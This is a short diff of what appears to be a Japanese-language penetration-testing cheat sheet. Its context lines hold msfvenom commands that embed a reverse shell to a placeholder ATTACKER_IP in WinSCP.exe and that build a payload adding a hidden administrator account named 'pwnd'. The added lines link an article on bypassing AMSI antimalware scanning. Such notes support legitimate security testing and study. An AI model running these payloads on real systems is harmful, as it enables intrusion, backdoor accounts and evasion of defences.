@@ -335,3 +335,7 @@ msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7
 ```shell
 msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp
 ```
+
+## AMSIバイパス方法（記事）
+
+https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
